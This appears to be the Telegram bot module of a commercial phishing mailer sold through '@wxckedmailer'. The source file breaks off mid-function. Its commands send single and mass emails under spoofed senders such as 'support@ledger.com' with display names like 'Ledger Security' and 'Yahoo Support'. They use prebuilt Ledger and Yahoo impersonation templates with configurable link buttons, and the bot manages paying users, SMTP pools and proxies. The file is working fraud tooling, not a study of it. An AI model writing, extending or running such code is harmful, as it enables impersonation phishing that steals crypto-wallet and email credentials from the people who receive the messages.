const { ADMIN_USERNAME, TG_SESSION_TTL_MS } = require('./config');
const {
  readJSON, readJSONSync, writeJSON, readUserData, writeUserData,
  getSettings, saveSettings,
  TEAM_FILE, USERS_FILE, SMTP_CONFIGS_FILE, IMAP_CONFIGS_FILE,
  TEMPLATES_FILE, SCHEDULES_FILE, PROXIES_FILE
} = require('./storage');
const fs = require('fs-extra');
const path = require('path');
const { DATA_DIR } = require('./config');
const {
  getSharedSmtpConfigs, getUserSenderConfig, getBotSmtpConfig, createTransporter
} = require('./smtp');
const { buildLedgerHTML, buildYahooHTML } = require('./templates');

let bot = null;

// User session states for multi-step Telegram commands (with TTL)
const tgSessions = new Map();

function cleanupTgSessions() {
  const now = Date.now();
  for (const [chatId, session] of tgSessions) {
    if (now - session.createdAt > TG_SESSION_TTL_MS) {
      tgSessions.delete(chatId);
    }
  }
}

// Clean up expired Telegram sessions every 5 minutes
setInterval(cleanupTgSessions, 5 * 60 * 1000).unref();

function isAdmin(username) {
  if (!username) return false;
  return username.toLowerCase().replace('@', '') === ADMIN_USERNAME;
}

function isAllowedUser(username) {
  if (!username) return false;
  const clean = username.toLowerCase().replace('@', '');
  if (clean === ADMIN_USERNAME) return true;
  const team = readJSONSync(TEAM_FILE);
  const isActiveTeamMember = team.some(m => m.telegramId && m.telegramId.toLowerCase().replace('@', '') === clean && m.status === 'active');
  if (isActiveTeamMember) return true;

  // Web users can be assigned a Telegram username before they complete /link.
  const users = readJSONSync(USERS_FILE);
  return users.some(u => u.telegramId && u.telegramId.toLowerCase().replace('@', '') === clean);
}

function getUserFromMsg(msg) {
  return msg.from?.username || msg.from?.first_name || '';
}

function findUserByTelegram(username) {
  const clean = username.toLowerCase().replace('@', '');
  const users = readJSONSync(USERS_FILE);
  return users.find(u => u.telegramId && u.telegramId.toLowerCase().replace('@', '') === clean);
}

function findUserByChatId(chatId) {
  const users = readJSONSync(USERS_FILE);
  return users.find(u => u.telegramChatId && String(u.telegramChatId) === String(chatId));
}

function mainKeyboard(isAdminUser) {
  const rows = [
    [{ text: '📧 Send Email', callback_data: 'send' }, { text: '🚀 Mass Mail', callback_data: 'mass' }],
    [{ text: '📄 Ledger Template', callback_data: 'ledger' }, { text: '📄 Yahoo Template', callback_data: 'yahoo' }],
    [{ text: '📊 Status', callback_data: 'status' }, { text: '📝 Templates', callback_data: 'templates' }],
    [{ text: '📄 Upload HTML', callback_data: 'uploadhtml' }, { text: '📧 Send HTML', callback_data: 'sendhtml' }],
    [{ text: '🖼️ Set Profile Pic', callback_data: 'setprofilepic' }, { text: '📛 Set Sender Name', callback_data: 'setname' }],
    [{ text: '📧 Set Spoof Email', callback_data: 'setspoofemail' }, { text: ' Link Account', callback_data: 'link' }],
    [{ text: '⚙️ Settings', callback_data: 'settings' }],
  ];
  if (isAdminUser) {
    rows.push([
      { text: '👤 Add User', callback_data: 'adduser' },
      { text: '❌ Remove User', callback_data: 'removeuser' },
    ]);
    rows.push([
      { text: '👥 Add Member', callback_data: 'addmember' },
      { text: '❌ Remove Member', callback_data: 'removemember' },
    ]);
    rows.push([
      { text: '👑 Edit Ledger', callback_data: 'setledger' },
      { text: '👑 Edit Yahoo', callback_data: 'setyahoo' },
    ]);
    rows.push([
      { text: '👤 Users List', callback_data: 'users' },
      { text: '👥 Members List', callback_data: 'members' },
    ]);
  }
  return { reply_markup: { inline_keyboard: rows } };
}

function sendKeyboard(chatId, text) {
  return bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
}

async function sendTelegramNotification(message, targetChatId) {
  if (!bot) throw new Error('Telegram bot not configured.');
  const chatId = targetChatId || process.env.TELEGRAM_CHAT_ID;
  if (!chatId || chatId === 'YOUR_CHAT_ID')
    throw new Error('Telegram CHAT_ID not configured.');
  return await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
}

function setupTelegramBot() {
  if (!bot) return;

  // ==== INLINE KEYBOARD CALLBACKS =====
  bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const username = getUserFromMsg(callbackQuery);
    const data = callbackQuery.data;
    
    if (!isAllowedUser(username)) {
      return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Join @wxckedmailer\nContact @wxckedsupport to purchase', show_alert: true });
    }
    
    await bot.answerCallbackQuery(callbackQuery.id);
    
    switch (data) {
      case 'send':
        tgSessions.set(msg.chat.id, { step: 'send_to', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '📧 *Send Email*\n\nStep 1/3: Enter the recipient email address:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'mass':
        tgSessions.set(msg.chat.id, { step: 'mass_recipients', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '🚀 *Mass Mail*\n\nStep 1/3: Enter recipient emails (comma separated):\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'ledger': {
        tgSessions.set(msg.chat.id, { step: 'ledger_to', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '📄 *Send Ledger Template*\n\nStep 1/1: Enter the target email address:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      }
      case 'yahoo': {
        tgSessions.set(msg.chat.id, { step: 'yahoo_to', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '📄 *Send Yahoo Template*\n\nStep 1/1: Enter the target email address:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      }
      case 'status': {
        const configs = await readJSON(SMTP_CONFIGS_FILE);
        const imapConfigs = await readJSON(IMAP_CONFIGS_FILE);
        const templates = await readJSON(TEMPLATES_FILE);
        const schedules = await readJSON(SCHEDULES_FILE);
        const proxies = await readJSON(PROXIES_FILE);
        const team = await readJSON(TEAM_FILE);
        const users = await readJSON(USERS_FILE);
        const status = `📊 *System Status*\n\n` +
          `🖥️ Server: ✅ Running\n` +
          `📧 SMTP Configs: ${configs.length}\n` +
          `📥 IMAP Configs: ${imapConfigs.length}\n` +
          `📝 Templates: ${templates.length}\n` +
          `⏰ Schedules: ${schedules.length}\n` +
          `🔗 Proxies: ${proxies.length}\n` +
          `👥 Team Members: ${team.length}\n` +
          `👤 Web Users: ${users.length}\n` +
          `🤖 Bot: ✅ Online\n` +
          `👑 Admin: @${ADMIN_USERNAME}`;
        await bot.sendMessage(msg.chat.id, status, { parse_mode: 'Markdown' });
        break;
      }
      case 'templates': {
        const user = findUserByChatId(msg.chat.id);
        const templates = user ? await readUserData(user.id, 'templates') : await readJSON(TEMPLATES_FILE);
        if (!templates.length) return bot.sendMessage(msg.chat.id, '📝 No templates saved yet.');
        const list = templates.map((t, i) => `${i + 1}. *${t.name}*\n   Subject: ${t.subject}\n   ID: \`${t.id}\``).join('\n\n');
        await bot.sendMessage(msg.chat.id, `📝 *Saved Templates:*\n\n${list}`, { parse_mode: 'Markdown' });
        break;
      }
      case 'settings': {
        const settings = await getSettings();
        const text = `⚙️ *Current Settings*\n\n` +
          `*Ledger Template:*\n` +
          `Subject: ${settings.ledgerSubject}\n` +
          `Button Text: ${settings.ledgerButtonText}\n` +
          `Button URL: ${settings.ledgerButtonUrl}\n\n` +
          `*Yahoo Template:*\n` +
          `Subject: ${settings.yahooSubject}\n` +
          `Case ID: ${settings.yahooCaseId}`;
        await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
        break;
      }
      case 'adduser':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        tgSessions.set(msg.chat.id, { step: 'adduser_username', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '👤 *Add Web Panel User*\n\nStep 1/3: Enter the username:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'removeuser':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        tgSessions.set(msg.chat.id, { step: 'removeuser_username', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '❌ *Remove Web Panel User*\n\nStep 1/1: Enter the username to remove:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'addmember':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        tgSessions.set(msg.chat.id, { step: 'addmember_username', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '👥 *Add Telegram Member*\n\nStep 1/1: Enter the Telegram username (without @):\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'removemember':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        tgSessions.set(msg.chat.id, { step: 'removemember_username', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '❌ *Remove Telegram Member*\n\nStep 1/1: Enter the Telegram username (without @):\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'setledger':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        tgSessions.set(msg.chat.id, { step: 'ledger_subject', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '⚙️ *Customize Ledger Template*\n\nStep 1/6: Enter the email subject:\n(Current: ' + (await getSettings()).ledgerSubject + ')\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'setyahoo':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        tgSessions.set(msg.chat.id, { step: 'yahoo_subject', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '⚙️ *Customize Yahoo Template*\n\nStep 1/5: Enter the email subject:\n(Current: ' + (await getSettings()).yahooSubject + ')\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'users':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        const users = await readJSON(USERS_FILE);
        if (!users.length) return bot.sendMessage(msg.chat.id, '👤 No web panel users.');
        const userList = users.map(u => `• *${u.username}* (${u.role})${u.telegramId ? ' - @' + u.telegramId : ' - ⚠️ Not linked'}`).join('\n');
        await bot.sendMessage(msg.chat.id, `👤 *Web Panel Users:*\n\n${userList}`, { parse_mode: 'Markdown' });
        break;
      case 'members':
        if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this.');
        const team = await readJSON(TEAM_FILE);
        if (!team.length) return bot.sendMessage(msg.chat.id, '👥 No team members.');
        const memberList = team.map(m => `• @${m.telegramId} (${m.role}) - ${m.status}`).join('\n');
        await bot.sendMessage(msg.chat.id, `👥 *Team Members:*\n\n${memberList}`, { parse_mode: 'Markdown' });
        break;
      case 'link':
        tgSessions.set(msg.chat.id, { step: 'link_username', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '🔗 *Link Telegram to Web Panel*\n\nStep 1/2: Enter your web panel username:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'uploadhtml':
        tgSessions.set(msg.chat.id, { step: 'uploadhtml_name', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '📄 *Upload HTML Template*\n\nStep 1/2: Enter a name for this template:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'setprofilepic':
        tgSessions.set(msg.chat.id, { step: 'setprofilepic_wait', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '🖼️ *Set Sender Profile Picture*\n\nSend me an image to use as your sender profile picture.\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'setname':
        tgSessions.set(msg.chat.id, { step: 'setname_wait', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '📛 *Set Sender Name*\n\nSend me the name you want to use as your sender name (e.g. "Ledger Security"):\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'setspoofemail':
        tgSessions.set(msg.chat.id, { step: 'setspoofemail_wait', createdAt: Date.now() });
        await bot.sendMessage(msg.chat.id, '📧 *Set Spoofed Email*\n\nSend me the email address to display as the sender (e.g. support@ledger.com):\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
        break;
      case 'sendhtml':
        tgSessions.set(msg.chat.id, { step: 'sendhtml_select', createdAt: Date.now() });
        const userForHtml = findUserByChatId(msg.chat.id);
        const htmlTemplates = userForHtml ? await readUserData(userForHtml.id, 'templates') : await readJSON(TEMPLATES_FILE);
        const htmlList = htmlTemplates.filter(t => t.isHtml).map((t, i) => `${i + 1}. *${t.name}* - \`${t.id}\``).join('\n');
        if (!htmlList) {
          return bot.sendMessage(msg.chat.id, '📄 No HTML templates found. Use /uploadhtml to upload one first.');
        }
        await bot.sendMessage(msg.chat.id, `📧 *Send HTML Template*\n\nAvailable HTML templates:\n${htmlList}\n\nStep 1/2: Enter the template ID:\n\nType /cancel to abort.`, { parse_mode: 'Markdown' });
        break;
    }
  });

  bot.onText(/\/start/, async (msg) => {
    const username = getUserFromMsg(msg);
    const settings = await getSettings();
    const user = findUserByChatId(msg.chat.id);
    if (!isAllowedUser(username) && !user) {
      return bot.sendMessage(msg.chat.id, '🚫 *Access Denied*\n\nJoin @wxckedmailer\nContact @icyfeel to purchase', { parse_mode: 'Markdown' });
    }
    bot.sendMessage(msg.chat.id, `👋 ${settings.telegramWelcome}\n\nYour username: @${username}\nRole: ${isAdmin(username) ? '👑 Admin' : '👤 Member'}\n\nChoose an option below:`, mainKeyboard(isAdmin(username)));
  });

  bot.onText(/\/help/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const settings = await getSettings();
    bot.sendMessage(msg.chat.id, settings.telegramHelp);
  });

  bot.onText(/\/menu/, (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    bot.sendMessage(msg.chat.id, '📋 *Main Menu*\n\nChoose an option below:', mainKeyboard(isAdmin(username)));
  });

  bot.onText(/\/link/, (msg) => {
    // Allow anyone to use /link - no team membership required
    tgSessions.set(msg.chat.id, { step: 'link_username', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, '🔗 *Link Telegram to Web Panel*\n\nStep 1/2: Enter your web panel username:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
  });

  // ===== UPLOAD HTML TEMPLATE =====
  bot.onText(/\/uploadhtml/, (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    tgSessions.set(msg.chat.id, { step: 'uploadhtml_name', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, '📄 *Upload HTML Template*\n\nStep 1/2: Enter a name for this template:\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
  });

  // ===== SET SENDER PROFILE PICTURE =====
  bot.onText(/\/setprofilepic/, (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    tgSessions.set(msg.chat.id, { step: 'setprofilepic_wait', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, '🖼️ *Set Sender Profile Picture*\n\nSend me an image to use as your sender profile picture.\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
  });

  // ===== SET SENDER NAME =====
  bot.onText(/\/setname/, (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    tgSessions.set(msg.chat.id, { step: 'setname_wait', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, '📛 *Set Sender Name*\n\nSend me the name you want to use as your sender name (e.g. "Ledger Security"):\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
  });

  // ===== SET SPOOFED EMAIL =====
  bot.onText(/\/setspoofemail/, (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    tgSessions.set(msg.chat.id, { step: 'setspoofemail_wait', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, '📧 *Set Spoofed Email*\n\nSend me the email address to display as the sender (e.g. support@ledger.com):\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
  });

  // ===== SEND HTML TEMPLATE =====
  bot.onText(/\/sendhtml/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const user = findUserByChatId(msg.chat.id);
    const templates = user ? await readUserData(user.id, 'templates') : await readJSON(TEMPLATES_FILE);
    const htmlTemplates = templates.filter(t => t.isHtml);
    if (!htmlTemplates.length) return bot.sendMessage(msg.chat.id, '📄 No HTML templates found. Use /uploadhtml to upload one first.');
    const list = htmlTemplates.map((t, i) => `${i + 1}. *${t.name}* - \`${t.id}\``).join('\n');
    tgSessions.set(msg.chat.id, { step: 'sendhtml_select', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, `📧 *Send HTML Template*\n\nAvailable HTML templates:\n${list}\n\nStep 1/2: Enter the template ID:\n\nType /cancel to abort.`, { parse_mode: 'Markdown' });
  });

  bot.onText(/\/login/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const user = findUserByTelegram(username);
    if (!user) return bot.sendMessage(msg.chat.id, '❌ Your Telegram is not linked to any web panel account. Use /link to link first.');
    const senderConfig = await getUserSenderConfig(user.id);
    const customSmtpNote = senderConfig.hasCustomSmtp
      ? '\n📧 *Sender:* Using your custom SMTP (shared domain disabled)'
      : `\n📧 *Sender Email:* \`${senderConfig.senderEmail}\`\n🌐 *Domain:* \`${senderConfig.domain}\``;
    bot.sendMessage(msg.chat.id, `🔐 *Your Web Panel Credentials*\n\n👤 Username: \`${user.username}\`\n🔑 Password: \`${user.password}\`${customSmtpNote}\n\n📧 Panel URL: http://localhost:${process.env.PORT || 3000}\n\n⚠️ Keep these credentials secure!\n💡 Use /setsender to change your sender email domain & prefix.`, { parse_mode: 'Markdown' });
  });

  // ===== SET SENDER (domain & prefix) =====
  bot.onText(/\/setsender/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const user = findUserByTelegram(username) || findUserByChatId(msg.chat.id);
    if (!user) return bot.sendMessage(msg.chat.id, '❌ Your Telegram is not linked to any web panel account. Use /link to link first.');
    const userConfigs = await readUserData(user.id, 'smtp-configs');
    if (userConfigs.length > 0) {
      return bot.sendMessage(msg.chat.id, 'ℹ️ You have custom SMTP configs added, so the shared sender email is not used. Remove your custom SMTPs to use the shared domains.');
    }
    const senderConfig = await getUserSenderConfig(user.id);
    const domains = getSharedSmtpConfigs().map(s => `• \`${s.domain}\``).join('\n');
    tgSessions.set(msg.chat.id, { step: 'setsender_domain', userId: user.id, createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, `📧 *Set Sender Email*\n\nCurrent sender: \`${senderConfig.senderEmail}\`\n\nAvailable domains:\n${domains}\n\nStep 1/2: Enter the domain you want to use (e.g. irnna.com):`, { parse_mode: 'Markdown' });
  });

  bot.onText(/\/status/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const configs = await readJSON(SMTP_CONFIGS_FILE);
    const imapConfigs = await readJSON(IMAP_CONFIGS_FILE);
    const templates = await readJSON(TEMPLATES_FILE);
    const schedules = await readJSON(SCHEDULES_FILE);
    const proxies = await readJSON(PROXIES_FILE);
    const team = await readJSON(TEAM_FILE);
    const users = await readJSON(USERS_FILE);
    const status = `📊 *System Status*\n\n` +
      `🖥️ Server: ✅ Running\n` +
      `📧 SMTP Configs: ${configs.length}\n` +
      `📥 IMAP Configs: ${imapConfigs.length}\n` +
      `📝 Templates: ${templates.length}\n` +
      `⏰ Schedules: ${schedules.length}\n` +
      `🔗 Proxies: ${proxies.length}\n` +
      `👥 Team Members: ${team.length}\n` +
      `👤 Web Users: ${users.length}\n` +
      `🤖 Bot: ✅ Online\n` +
      `👑 Admin: @${ADMIN_USERNAME}`;
    bot.sendMessage(msg.chat.id, status, { parse_mode: 'Markdown' });
  });

  bot.onText(/\/templates/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const user = findUserByChatId(msg.chat.id);
    const templates = user ? await readUserData(user.id, 'templates') : await readJSON(TEMPLATES_FILE);
    if (!templates.length) return bot.sendMessage(msg.chat.id, '📝 No templates saved yet.');
    const list = templates.map((t, i) => `${i + 1}. *${t.name}*\n   Subject: ${t.subject}\n   ID: \`${t.id}\``).join('\n\n');
    bot.sendMessage(msg.chat.id, `📝 *Saved Templates:*\n\n${list}`, { parse_mode: 'Markdown' });
  });

  // ===== SEND EMAIL =====
  bot.onText(/\/send (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const args = match[1].split('|').map(s => s.trim());
    if (args.length < 3) {
      return bot.sendMessage(msg.chat.id, '❌ Usage: /send to@email.com | Subject | Message body');
    }
    const [to, subject, ...bodyParts] = args;
    const body = bodyParts.join('|');
    try {
      const user = findUserByChatId(msg.chat.id);
      const smtpConf = await getBotSmtpConfig(user);
      const transporter = createTransporter(smtpConf);
      const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
      const fromName = smtpConf.spoofName || '';
      const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
      await transporter.sendMail({ from: fromStr, to, subject, text: body, html: body });
      bot.sendMessage(msg.chat.id, `✅ Email sent to ${to}\nSubject: ${subject}`);
    } catch (err) {
      bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
    }
  });

  // ===== MASS EMAIL =====
  bot.onText(/\/mass (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const args = match[1].split('|').map(s => s.trim());
    if (args.length < 3) {
      return bot.sendMessage(msg.chat.id, '❌ Usage: /mass email1,email2,email3 | Subject | Message body');
    }
    const [recipientsStr, subject, ...bodyParts] = args;
    const body = bodyParts.join('|');
    const recipients = recipientsStr.split(',').map(s => s.trim()).filter(Boolean);
    if (!recipients.length) return bot.sendMessage(msg.chat.id, '❌ No valid recipients.');
    
    bot.sendMessage(msg.chat.id, `🚀 Starting mass mail to ${recipients.length} recipients...`);
    let sent = 0, failed = 0;
    try {
      const user = findUserByChatId(msg.chat.id);
      const smtpConf = await getBotSmtpConfig(user);
      const transporter = createTransporter(smtpConf);
      const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
      const fromName = smtpConf.spoofName || '';
      const fromStr = fromName ? `"${fromName}" <${fromEmail}>` : fromEmail;
      for (const email of recipients) {
        try {
          await transporter.sendMail({ from: fromStr, to: email, subject, text: body, html: body });
          sent++;
        } catch { failed++; }
        await new Promise(r => setTimeout(r, 200));
      }
      bot.sendMessage(msg.chat.id, `📬 Mass mail complete!\n✅ Sent: ${sent}\n❌ Failed: ${failed}\n📊 Total: ${recipients.length}`);
    } catch (err) {
      bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
    }
  });

  // ===== LEDGER TEMPLATE =====
  bot.onText(/\/ledger (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const to = match[1].trim();
    if (!to.includes('@')) return bot.sendMessage(msg.chat.id, '❌ Invalid email address.');
    const settings = await getSettings();
    const html = buildLedgerHTML(settings);
    try {
      const user = findUserByChatId(msg.chat.id);
      const smtpConf = await getBotSmtpConfig(user);
      const transporter = createTransporter(smtpConf);
      const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
      const fromName = smtpConf.spoofName || 'Ledger Security';
      const fromStr = `"${fromName}" <${fromEmail}>`;
      await transporter.sendMail({ from: fromStr, to, subject: settings.ledgerSubject, html });
      bot.sendMessage(msg.chat.id, `✅ Ledger template email sent to ${to}`);
    } catch (err) {
      bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
    }
  });

  // ===== YAHOO TEMPLATE =====
  bot.onText(/\/yahoo (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const to = match[1].trim();
    if (!to.includes('@')) return bot.sendMessage(msg.chat.id, '❌ Invalid email address.');
    const settings = await getSettings();
    const html = buildYahooHTML(settings);
    try {
      const user = findUserByChatId(msg.chat.id);
      const smtpConf = await getBotSmtpConfig(user);
      const transporter = createTransporter(smtpConf);
      const fromEmail = smtpConf.spoofEmail || smtpConf.user || process.env.SMTP_USER;
      const fromName = smtpConf.spoofName || 'Yahoo Support';
      const fromStr = `"${fromName}" <${fromEmail}>`;
      await transporter.sendMail({ from: fromStr, to, subject: settings.yahooSubject, html });
      bot.sendMessage(msg.chat.id, `✅ Yahoo template email sent to ${to}`);
    } catch (err) {
      bot.sendMessage(msg.chat.id, `❌ Failed: ${err.message}`);
    }
  });

  // ===== SETTINGS =====
  bot.onText(/\/settings/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAllowedUser(username)) return bot.sendMessage(msg.chat.id, '🚫 Join @wxckedmailer\nContact @icyfeel to purchase');
    const settings = await getSettings();
    const text = `⚙️ *Current Settings*\n\n` +
      `*Ledger Template:*\n` +
      `Subject: ${settings.ledgerSubject}\n` +
      `Button Text: ${settings.ledgerButtonText}\n` +
      `Button URL: ${settings.ledgerButtonUrl}\n\n` +
      `*Yahoo Template:*\n` +
      `Subject: ${settings.yahooSubject}\n` +
      `Case ID: ${settings.yahooCaseId}\n\n` +
      `Use /setledger or /setyahoo to customize.`;
    bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown' });
  });

  // ===== SET LEDGER =====
  bot.onText(/\/setledger/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    tgSessions.set(msg.chat.id, { step: 'ledger_subject', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, '⚙️ *Customize Ledger Template*\n\nStep 1/6: Enter the email subject:\n(Current: ' + (await getSettings()).ledgerSubject + ')\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
  });

  // ===== SET YAHOO =====
  bot.onText(/\/setyahoo/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    tgSessions.set(msg.chat.id, { step: 'yahoo_subject', createdAt: Date.now() });
    bot.sendMessage(msg.chat.id, '⚙️ *Customize Yahoo Template*\n\nStep 1/5: Enter the email subject:\n(Current: ' + (await getSettings()).yahooSubject + ')\n\nType /cancel to abort.', { parse_mode: 'Markdown' });
  });

  // ===== ADD USER (web panel) =====
  bot.onText(/\/adduser (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    const args = match[1].split(' ').filter(Boolean);
    if (args.length < 2) return bot.sendMessage(msg.chat.id, '❌ Usage: /adduser username password');
    const [uname, pass] = args;
    const users = await readJSON(USERS_FILE);
    if (users.find(u => u.username === uname)) return bot.sendMessage(msg.chat.id, '❌ User already exists.');
    users.push({ id: Date.now().toString(), username: uname, password: pass, role: 'user', telegramId: '', telegramChatId: '', createdAt: new Date().toISOString() });
    await writeJSON(USERS_FILE, users);
    bot.sendMessage(msg.chat.id, `✅ Web panel user *${uname}* added!\nUsername: ${uname}\nPassword: ${pass}\n\nTo link their Telegram, have them send /link to this bot.`, { parse_mode: 'Markdown' });
  });

  // ===== REMOVE USER =====
  bot.onText(/\/removeuser (.+)/, async (msg, match) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    const uname = match[1].trim();
    let users = await readJSON(USERS_FILE);
    const user = users.find(u => u.username === uname);
    if (!user) return bot.sendMessage(msg.chat.id, '❌ User not found.');
    if (user.role === 'admin') return bot.sendMessage(msg.chat.id, '❌ Cannot remove the admin user.');
    users = users.filter(u => u.username !== uname);
    await writeJSON(USERS_FILE, users);
    bot.sendMessage(msg.chat.id, `✅ Web panel user *${uname}* removed!`, { parse_mode: 'Markdown' });
  });

  // ===== LIST USERS =====
  bot.onText(/\/users/, async (msg) => {
    const username = getUserFromMsg(msg);
    if (!isAdmin(username)) return bot.sendMessage(msg.chat.id, '❌ Only @' + ADMIN_USERNAME + ' can use this command.');
    const users = await readJSON(USERS_FILE);
    if (!users.length) return bot.sendMessage(msg.chat.id, '👤 No web panel users.');
